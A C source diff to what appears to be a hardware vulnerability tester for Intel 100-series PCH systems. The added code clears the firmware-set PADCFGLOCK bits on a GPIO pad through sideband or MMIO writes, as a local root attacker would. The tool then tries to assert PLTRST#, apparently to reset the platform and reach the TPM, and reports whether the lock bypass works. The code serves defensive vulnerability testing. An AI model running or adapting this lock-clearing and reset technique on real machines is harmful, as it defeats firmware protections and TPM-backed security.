@@ -196,6 +196,9 @@ int main(int argc, char *argv[])
 	uint16_t offset;
 	uint16_t lock_offset;
 	uint32_t lock_bit;
+	uint32_t lock_orig = 0, locktx_orig = 0;
+	int had_lock = 0;
+	int lock_bypass = -1; /* -1 = not attempted, 0 = re-locked, 1 = cleared */
 
 	switch (sb->device_id) {
 	case PCI_DEVICE_ID_INTEL_H110:
@@ -428,6 +431,10 @@ int main(int argc, char *argv[])
 			int cfg_locked = !!(lock_val & lock_bit);
 			int tx_locked = !!(locktx_val & lock_bit);
 
+			lock_orig = lock_val;
+			locktx_orig = locktx_val;
+			had_lock = cfg_locked || tx_locked;
+
 			printf("\n--- PADCFGLOCK Status (port 0x%x, offset 0x%x) ---\n", port, lock_offset);
 			printf("PADCFGLOCK   = 0x%08x (%s, bit %d %s)\n",
 			       lock_val,
@@ -440,9 +447,10 @@ int main(int argc, char *argv[])
 			       bit,
 			       tx_locked ? "set" : "clear");
 
-			if (cfg_locked || tx_locked) {
-				printf("\nWARNING: Pad is LOCKED -- assertion write will be silently ignored!\n");
-			}
+			if (had_lock)
+				printf("Pad config is locked by firmware. PADCFGLOCK is RW\n"
+				       "(Intel 100 Series PCH Vol 2 25.1.10/25.1.12), so a\n"
+				       "local attacker can clear it. Testing that bypass now.\n");
 		}
 
 		/* Read PCRs before assertion */
@@ -483,11 +491,13 @@ int main(int argc, char *argv[])
 				dom == 3 ? "unmapped/GLBRST" : "RSMRST/PWROK";
 			printf("DW0 domain = %s (bits 31:30 = %u)\n", domain, (unsigned)dom);
 		}
-		/* HOST_OWN for GPP_B13 (SKL/KBL community 0, group 1): 1 = host owns
-		 * the pad (reconfigurable), 0 = SMM keeps ownership (host writes gated) */
+		/* HOSTSW_OWN_GPP_B (SKL/KBL community 0): 1 = GPIO Driver Mode,
+		 * 0 = ACPI Mode. It selects which status register input events
+		 * update; it does NOT gate pad-configuration writes. */
 		if (port == 0xaf) {
 			uint32_t host_own = read_pcr32(0xaf, 0xd4);
-			printf("HOST_OWN (0xAF:0xD4 bit 13, GPP_B13) = %d\n",
+			printf("HOSTSW_OWN (0xAF:0xD4 bit 13, GPP_B13) = %d "
+			       "(event routing only; does not gate pad writes)\n",
 			       !!(host_own & (1u << 13)));
 		}
 
@@ -516,6 +526,46 @@ int main(int argc, char *argv[])
 			printf("*** PLTRST# reset edge may NOT be created.            ***\n");
 		}
 
+		/* Clear PADCFGLOCK/PADCFGLOCKTX the way a local root attacker
+		 * would, then verify the clear survived. If SMM re-locks the pad
+		 * the firmware mitigation holds; if it stays clear the pad is
+		 * still reconfigurable and PLTRST# can be asserted. */
+		if (!no_padcfglock && had_lock) {
+			printf("\n--- PADCFGLOCK Bypass ---\n");
+			/* Pre-ADL PADCFGLOCK can only be cleared via a
+			 * non-posted sideband write; plain MMIO is a no-op
+			 * there (coreboot gpio/Kconfig "Till ADL PCH ..."). */
+			if (pcr_use_p2sb) {
+				if (pcr_lock_regs_sbi(sb, port, lock_offset,
+							lock_orig & ~lock_bit,
+							lock_offset + 4,
+							locktx_orig & ~lock_bit)) {
+					printf("SBI lock clear failed -- cannot test bypass\n");
+					lock_bypass = -1;
+				} else {
+					usleep(10000);
+					uint32_t l = read_pcr32(port, lock_offset);
+					uint32_t lt = read_pcr32(port, lock_offset + 4);
+					lock_bypass = !(l & lock_bit) && !(lt & lock_bit);
+					printf("Cleared bit %d via SBI: PADCFGLOCK=0x%08x PADCFGLOCKTX=0x%08x -> %s\n",
+					       __builtin_ctz(lock_bit), l, lt,
+					       lock_bypass == 1 ? "stays clear (pad still writable: VULNERABLE)"
+					                        : "re-locked (SMM enforces the lock: MITIGATED)");
+				}
+			} else {
+				write_pcr32(port, lock_offset, lock_orig & ~lock_bit);
+				write_pcr32(port, lock_offset + 4, locktx_orig & ~lock_bit);
+				usleep(10000);
+				uint32_t l = read_pcr32(port, lock_offset);
+				uint32_t lt = read_pcr32(port, lock_offset + 4);
+				lock_bypass = !(l & lock_bit) && !(lt & lock_bit);
+				printf("Cleared bit %d: PADCFGLOCK=0x%08x PADCFGLOCKTX=0x%08x -> %s\n",
+				       __builtin_ctz(lock_bit), l, lt,
+				       lock_bypass ? "stays clear (pad still writable: VULNERABLE)"
+				                   : "re-locked (SMM enforces the lock: MITIGATED)");
+			}
+		}
+
 		/* Flush stdout before assertion -- output after platform reset may be lost */
 		fflush(stdout);
 
@@ -531,7 +581,7 @@ int main(int argc, char *argv[])
 		int dw1_ok = (dw1_rb == 0x00000000);
 		printf("DW0 (asserted) = 0x%08x  DW1 (asserted) = 0x%08x\n", dw0_rb, dw1_rb);
 		if (!dw0_ok)
-			printf("DW0 write ignored -- PADCFGLOCK set, pad configuration locked\n");
+			printf("DW0 write ignored -- pad config is still locked\n");
 		if (!dw1_ok)
 			printf("DW1 TX state unlocked (expected; the config lock gates the pad)\n");
 
@@ -539,6 +589,17 @@ int main(int argc, char *argv[])
 		write_pcr32(port, offset + 4, dw1);
 
 		printf("Registers restored\n");
+
+		if (!no_padcfglock && had_lock) {
+			if (pcr_use_p2sb)
+				pcr_lock_regs_sbi(sb, port, lock_offset, lock_orig,
+						  lock_offset + 4, locktx_orig);
+			else {
+				write_pcr32(port, lock_offset, lock_orig);
+				write_pcr32(port, lock_offset + 4, locktx_orig);
+			}
+			printf("PADCFGLOCK restored\n");
+		}
 
 		/* Reinitialize TPM after reset (kukri procedure) */
 		if (gen == 2) {
@@ -567,8 +628,10 @@ int main(int argc, char *argv[])
 		exit_code = 126;
 
 	printf("\n=== RESULT: %s ===\n",
-	       exit_code == 0 ? "DW0 write accepted -- pad reconfiguration possible (vulnerable)" :
-	       exit_code == 1 ? "DW0 write ignored -- PLTRST# pad configuration locked (PADCFGLOCK set): assertion blocked" :
+	       exit_code == 0 ? (lock_bypass == 1
+			? "PADCFGLOCK cleared and DW0 write accepted -- firmware lock is bypassable (vulnerable)"
+			: "DW0 write accepted -- pad reconfiguration possible (vulnerable)") :
+	       exit_code == 1 ? "DW0 write ignored -- PLTRST# pad stays locked (PADCFGLOCK set or SMM re-locked): assertion blocked" :
 	       exit_code == 2 ? "not vulnerable (assertion skipped)" :
 	       exit_code == 126 ? "unknown PCH" :
 	       "hardware access error");
